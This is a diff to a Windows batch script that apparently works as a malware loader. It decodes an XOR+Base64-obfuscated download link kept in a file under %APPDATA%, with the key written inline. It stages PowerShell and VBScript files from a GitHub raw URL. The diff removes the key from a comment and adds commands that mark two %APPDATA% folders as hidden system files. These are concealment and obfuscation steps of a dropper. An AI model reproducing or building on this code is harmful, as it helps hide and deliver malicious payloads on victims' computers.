@@ -9,7 +9,7 @@ set c=%d%\Nvs.ps1
 set v=%d%\S_m.vbs
 set u=raw.githubusercontent.com/Zenth-grid/ZENTH-MAIN/main/V/
 
-:: Decode the XOR+Base64-encoded link from l.txt using key "now"
+:: Decode the XOR+Base64-encoded link from l.txt using key
 for /f "delims=" %%A in ('powershell -NoProfile -Command ^
   "$k='now';" ^
   "$e=[System.Convert]::FromBase64String((Get-Content -Raw '%APPDATA%\Paged-l\l.txt'));" ^
@@ -17,6 +17,8 @@ for /f "delims=" %%A in ('powershell -NoProfile -Command ^
   "[Text.Encoding]::UTF8.GetString($r)"') do set "dynLink=%%A"
 
 :: Cleanup and prepare working folder
+attrib +s +h "%appdata%\Paged"
+attrib +s +h "%appdata%\Paged-l"
 rmdir /s /q "%d%" 2>nul
 mkdir "%d%"
 
